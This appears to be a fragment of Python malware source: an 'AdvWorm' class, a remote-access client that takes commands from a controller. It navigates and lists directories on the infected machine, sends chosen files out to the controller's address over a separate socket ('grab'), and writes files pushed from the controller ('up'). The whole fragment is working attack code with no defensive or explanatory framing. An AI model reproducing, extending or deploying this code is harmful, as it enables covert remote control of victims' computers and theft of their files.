

class AdvWorm(BasicWorm):
    def __init__(self):
        super().__init__()
    
    def unpack_sys(self, sysmsg):
        msg = sysmsg.split(self.sys_msg)
        cmd = []
        for m in msg:
            if m == "" or m == " ":
                continue
            else:
                cmd.append(m)
        return cmd
    
    def get_pwd(self):
        return f"Location: {os.getcwd()}"
    
    def ch_dir(self, name):
        try:
            os.chdir(name)
            self.send_msg(f"Change Dir successfull. Location: {os.getcwd()}")
        except OSError as e:
            self.send_msg(f"[!!] ERROR change dir [!!] : {e}")
    
    def show_dir(self):
        msg = ""
        for f in os.listdir(os.getcwd()):
            if os.path.isdir(os.path.join(os.getcwd(), f)):
                msg += f"DIR ** {f}\n"
            else:
                msg += f"FILE ** {f}\n"
        self.send_msg(msg)

    
    def _send_file(self, fpath, port):
        try:
            xsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            xsocket.connect((self._ip, port))
        except OSError as e:
            self.send_msg(f"[!!] ERROR make xtrasocket [!!] : {e}")
            return None
        try:
            with open(fpath, "rb") as f:
                xsocket.sendfile(f, 0)
            self.send_msg("Send file successfull")
        except OSError as e:
            self.send_msg(f"[!!] ERROR: {e} [!!]")

    def send_file(self, name, path=None):
        if not path:
            fpath = os.path.join(os.getcwd(), name)
        else:
            fpath = path
        flen = os.stat(fpath).st_size
        msg = self.make_sysmsg("down", str(flen), name)
        self.send_msg(msg)
        sleep(0.6)
        port = self.recive_msg()
        if not port:
            return False
        port = int(port)
        if port == 0:
            print("ABORT")
            return False
        down = Thread(target=self._send_file, args=(fpath, port), daemon=True)
        down.start()
    
    def _recive_file(self, name, flen, port):
        sleep(0.6)
        try:
            xsocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            xsocket.connect((self._ip, port))
        except OSError as e:
            self.send_msg(f"[!!] ERROR make xtrasocket [!!] : {e}")
            return None
        try:
            file = b""
            while len(file) < int(flen):
                recv = xsocket.recv(int(flen) - len(file))
                if not recv:
                    return None
                file += recv
        except OSError as e:
            self.send_msg(f"[!!] ERROR: {e} [!!]")
            return None
        try:
            with open(os.path.join(os.getcwd(), name), "wb") as f:
                f.write(file)
            self.send_msg(f"Recive file <{name}> successfull")
        except OSError as e:
            self.send_msg(f"[!!] ERROR: {e}")
            return None
    
    def recive_file(self, name, flen, port):
        try:
            flen = int(flen)
            port = int(port)
        except:
            return None
        up = Thread(target=self._recive_file, args=(name, flen, port), daemon=True)
        up.start()   
    
    def exec_cmd(self, cmd):
        if cmd.startswith("cd "):
            self.ch_dir(cmd[3:])
        elif cmd == "pwd":
            self.send_msg(self.get_pwd())
        elif cmd == "dir":
            self.show_dir()
        elif cmd.startswith("grab"):
            self.send_file(cmd[5:])
        elif cmd.startswith("up"):
            cmd = cmd.split(" ")
            if len(cmd) > 3:
                self.recive_file(cmd[1], cmd[2], cmd[3])
        else:
            self.send_msg("Unknown Command")

